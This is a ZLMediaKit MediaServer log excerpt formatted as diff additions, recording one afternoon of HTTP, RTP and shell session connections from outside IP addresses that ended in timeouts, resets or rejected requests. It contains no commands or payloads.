+2024-08-23 13:59:28.708 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(180.163.28.114:58854) session timeout
+2024-08-23 13:59:28.708 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(180.163.28.114:58854) 
+2024-08-23 14:01:16.384 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(162.216.149.25:60908) 
+2024-08-23 14:01:17.018 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(162.216.149.25:60908) end of file
+2024-08-23 14:01:17.018 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(162.216.149.25:60908) 
+2024-08-23 14:12:03.663 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950408352(170.64.194.169:41082) 
+2024-08-23 14:12:06.368 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  end of file
+2024-08-23 14:12:06.368 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950408352(170.64.194.169:41082) 
+2024-08-23 14:22:10.713 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950416464(:0) 
+2024-08-23 14:22:10.713 W MediaServer[22196-event poller 2] Socket.cpp:91 operator() | Socket not set errCB
+2024-08-23 14:34:58.342 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(193.151.142.87:44850) 
+2024-08-23 14:34:58.343 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(193.151.142.87:44850) close connection after send http body completed.
+2024-08-23 14:34:58.343 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(193.151.142.87:44850) 
+2024-08-23 14:37:35.636 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(64.62.197.184:10425) 
+2024-08-23 14:37:37.476 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(64.62.197.184:10425) end of file
+2024-08-23 14:37:37.476 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(64.62.197.184:10425) 
+2024-08-23 14:38:34.192 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950407184(185.189.182.234:52190) 
+2024-08-23 14:38:34.370 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950407184(185.189.182.234:52190) connection reset by peer
+2024-08-23 14:38:34.370 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950407184(185.189.182.234:52190) 
+2024-08-23 14:44:34.169 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(34.76.236.135:35716) 
+2024-08-23 14:44:34.418 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(34.76.236.135:35716) end of file
+2024-08-23 14:44:34.418 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(34.76.236.135:35716) 
+2024-08-23 14:48:43.419 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(220.196.160.84:45468) 
+2024-08-23 14:48:43.424 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(220.196.160.84:45468) end of file
+2024-08-23 14:48:43.424 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(220.196.160.84:45468) 
+2024-08-23 14:57:22.232 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(167.94.145.105:49976) 
+2024-08-23 14:57:25.409 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(167.94.145.105:49976) connection reset by peer
+2024-08-23 14:57:25.409 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(167.94.145.105:49976) 
+2024-08-23 14:57:25.564 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950407184(167.94.145.105:50070) 
+2024-08-23 14:57:30.196 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950407184(167.94.145.105:50070) connection reset by peer
+2024-08-23 14:57:30.196 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950407184(167.94.145.105:50070) 
+2024-08-23 14:57:33.436 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950407184(167.94.145.105:60794) 
+2024-08-23 14:57:35.050 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950407184(167.94.145.105:60794) end of file
+2024-08-23 14:57:35.050 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950407184(167.94.145.105:60794) 
+2024-08-23 14:57:35.194 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950407120(167.94.145.105:60922) 
+2024-08-23 14:57:35.922 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950407120(167.94.145.105:60922) close connection after send http body completed.
+2024-08-23 14:57:35.922 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950407120(167.94.145.105:60922) 
+2024-08-23 14:57:36.247 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950407120(167.94.145.105:60970) 
+2024-08-23 14:57:36.704 W MediaServer[22196-event poller 2] HttpSession.cpp:66 onRecvHeader | 140493950407120(167.94.145.105:60970) 不支持该命令:PRI
+2024-08-23 14:57:36.704 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950407120(167.94.145.105:60970) close connection after send http header completed with status code:405
+2024-08-23 14:57:36.704 W MediaServer[22196-event poller 2] HttpSession.cpp:66 onRecvHeader | 140493950407120(167.94.145.105:60970) 不支持该命令:
+2024-08-23 14:57:36.704 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950407120(167.94.145.105:60970) 
+2024-08-23 14:57:38.363 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950406944(167.94.145.105:32836) 
+2024-08-23 14:57:38.696 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950406944(167.94.145.105:32836) connection reset by peer
+2024-08-23 14:57:38.696 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950406944(167.94.145.105:32836) 
+2024-08-23 14:57:40.206 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950406944(167.94.145.105:32878) 
+2024-08-23 14:57:40.541 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950406944(167.94.145.105:32878) connection reset by peer
+2024-08-23 14:57:40.541 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950406944(167.94.145.105:32878) 
+2024-08-23 14:57:41.916 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950406656(167.94.145.105:49312) 
+2024-08-23 14:57:42.333 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950406656(167.94.145.105:49312) connection reset by peer
+2024-08-23 14:57:42.333 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950406656(167.94.145.105:49312) 
+2024-08-23 15:18:38.729 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950406576(164.52.24.179:58549) 
+2024-08-23 15:18:41.767 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950406576(164.52.24.179:58549) connection reset by peer
+2024-08-23 15:18:41.767 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950406576(164.52.24.179:58549) 
+2024-08-23 15:18:41.962 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(164.52.24.179:56871) 
+2024-08-23 15:18:45.002 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(164.52.24.179:56871) connection reset by peer
+2024-08-23 15:18:45.002 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(164.52.24.179:56871) 
+2024-08-23 15:18:47.262 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(164.52.24.179:43623) 
+2024-08-23 15:18:50.263 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(164.52.24.179:43623) connection reset by peer
+2024-08-23 15:18:50.263 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(164.52.24.179:43623) 
+2024-08-23 15:18:50.511 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950406400(164.52.24.179:57439) 
+2024-08-23 15:19:08.876 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950406400(164.52.24.179:57439) connection reset by peer
+2024-08-23 15:19:08.876 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950406400(164.52.24.179:57439) 
+2024-08-23 15:34:14.885 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950406336(46.174.191.31:28586) 
+2024-08-23 15:34:45.186 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950406336(46.174.191.31:28586) connection reset by peer
+2024-08-23 15:34:45.186 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950406336(46.174.191.31:28586) 
+2024-08-23 15:41:24.453 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950409408(101.251.238.165:53751) 
+2024-08-23 15:41:30.453 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950409408(101.251.238.165:53751) connection reset by peer
+2024-08-23 15:41:30.454 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950409408(101.251.238.165:53751) 
+2024-08-23 15:41:30.480 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950406336(101.251.238.165:38399) 
+2024-08-23 15:41:31.580 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950409696(101.251.238.165:49547) 
+2024-08-23 15:41:31.580 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 15:41:31.580 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950409696(101.251.238.165:49547) end of file
+2024-08-23 15:41:31.580 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950409696(101.251.238.165:49547) 
+2024-08-23 15:41:34.581 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950406336(101.251.238.165:38399) connection reset by peer
+2024-08-23 15:41:34.581 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950406336(101.251.238.165:38399) 
+2024-08-23 15:41:35.613 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950300528(101.251.238.165:33671) 
+2024-08-23 15:41:35.704 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950408192(101.251.238.165:41105) 
+2024-08-23 15:41:35.704 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 15:41:35.704 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950408192(101.251.238.165:41105) end of file
+2024-08-23 15:41:35.704 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950408192(101.251.238.165:41105) 
+2024-08-23 15:41:49.208 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950300528(101.251.238.165:33671) connection reset by peer
+2024-08-23 15:41:49.208 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950300528(101.251.238.165:33671) 
+2024-08-23 15:41:49.237 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950300256(101.251.238.165:37193) 
+2024-08-23 15:41:49.237 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 15:41:49.265 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950300256(101.251.238.165:37193) connection reset by peer
+2024-08-23 15:41:49.265 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950300256(101.251.238.165:37193) 
+2024-08-23 15:41:49.291 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950300256(101.251.238.165:34463) 
+2024-08-23 15:41:49.295 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 15:41:49.616 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950300256(101.251.238.165:34463) connection reset by peer
+2024-08-23 15:41:49.616 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950300256(101.251.238.165:34463) 
+2024-08-23 15:41:49.643 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950300016(101.251.238.165:53707) 
+2024-08-23 15:41:49.752 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 15:41:49.793 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950300016(101.251.238.165:53707) connection reset by peer
+2024-08-23 15:41:49.793 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950300016(101.251.238.165:53707) 
+2024-08-23 15:41:52.022 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950408128(101.251.238.165:36547) 
+2024-08-23 15:41:55.380 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950408128(101.251.238.165:36547) connection reset by peer
+2024-08-23 15:41:55.380 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950408128(101.251.238.165:36547) 
+2024-08-23 15:41:55.385 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(101.251.238.165:58257) 
+2024-08-23 15:41:55.397 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:app.yinxiang.com, select default certificate of:zlmedaikit
+2024-08-23 15:41:58.427 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(101.251.238.165:58257) connection reset by peer
+2024-08-23 15:41:58.427 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(101.251.238.165:58257) 
+2024-08-23 15:47:15.612 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(185.224.128.84:36968) 
+2024-08-23 15:47:15.789 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(185.224.128.84:36968) end of file
+2024-08-23 15:47:15.789 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(185.224.128.84:36968) 
+2024-08-23 15:52:03.147 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(45.79.181.104:7288) 
+2024-08-23 15:52:33.481 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(45.79.181.104:7288) session timeout
+2024-08-23 15:52:33.481 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(45.79.181.104:7288) 
+2024-08-23 15:53:22.148 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(79.124.56.186:64073) 
+2024-08-23 15:53:53.495 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(79.124.56.186:64073) session timeout
+2024-08-23 15:53:53.495 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950290304(79.124.56.186:64073) 
+2024-08-23 16:06:31.654 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(205.210.31.90:63628) 
+2024-08-23 16:06:31.912 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(205.210.31.90:63628) end of file
+2024-08-23 16:06:31.912 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(205.210.31.90:63628) 
+2024-08-23 16:30:20.877 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(211.19.66.186:38768) 
+2024-08-23 16:30:20.881 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(211.19.66.186:38768) close connection after send http body completed.
+2024-08-23 16:30:20.881 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(211.19.66.186:38768) 
+2024-08-23 16:35:37.327 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(172.168.41.225:45832) 
+2024-08-23 16:35:38.334 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(172.168.41.225:45832) end of file
+2024-08-23 16:35:38.334 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(172.168.41.225:45832) 
+2024-08-23 17:06:29.061 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950291136(167.94.138.53:46646) 
+2024-08-23 17:06:32.418 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950291136(167.94.138.53:46646) connection reset by peer
+2024-08-23 17:06:32.418 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950291136(167.94.138.53:46646) 
+2024-08-23 17:06:36.425 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950291136(167.94.138.53:46680) 
+2024-08-23 17:06:46.701 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950291136(167.94.138.53:46680) connection reset by peer
+2024-08-23 17:06:46.701 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950291136(167.94.138.53:46680) 
+2024-08-23 17:10:54.433 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950414640(80.66.83.114:52394) 
+2024-08-23 17:11:05.578 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 17:11:05.578 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950414640(80.66.83.114:52394) 
+2024-08-23 17:11:05.940 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950414640(80.66.83.114:48742) 
+2024-08-23 17:11:17.584 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 17:11:17.584 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950414640(80.66.83.114:48742) 
+2024-08-23 17:11:17.946 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950414640(80.66.83.114:55696) 
+2024-08-23 17:11:29.590 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 17:11:29.590 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950414640(80.66.83.114:55696) 
+2024-08-23 17:14:34.822 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950291136(4.151.230.245:60122) 
+2024-08-23 17:14:40.271 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950291136(4.151.230.245:60122) end of file
+2024-08-23 17:14:40.271 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950291136(4.151.230.245:60122) 
+2024-08-23 17:19:32.489 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950406336(80.66.83.114:44204) 
+2024-08-23 17:19:43.804 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 17:19:43.804 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950406336(80.66.83.114:44204) 
+2024-08-23 17:19:44.141 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950290304(80.66.83.114:41374) 
+2024-08-23 17:19:55.807 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 17:19:55.807 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950290304(80.66.83.114:41374) 
+2024-08-23 17:19:56.134 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950406336(80.66.83.114:60838) 
+2024-08-23 17:20:07.813 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 17:20:07.813 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950406336(80.66.83.114:60838) 
+2024-08-23 17:23:46.357 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(172.168.155.102:51322) 
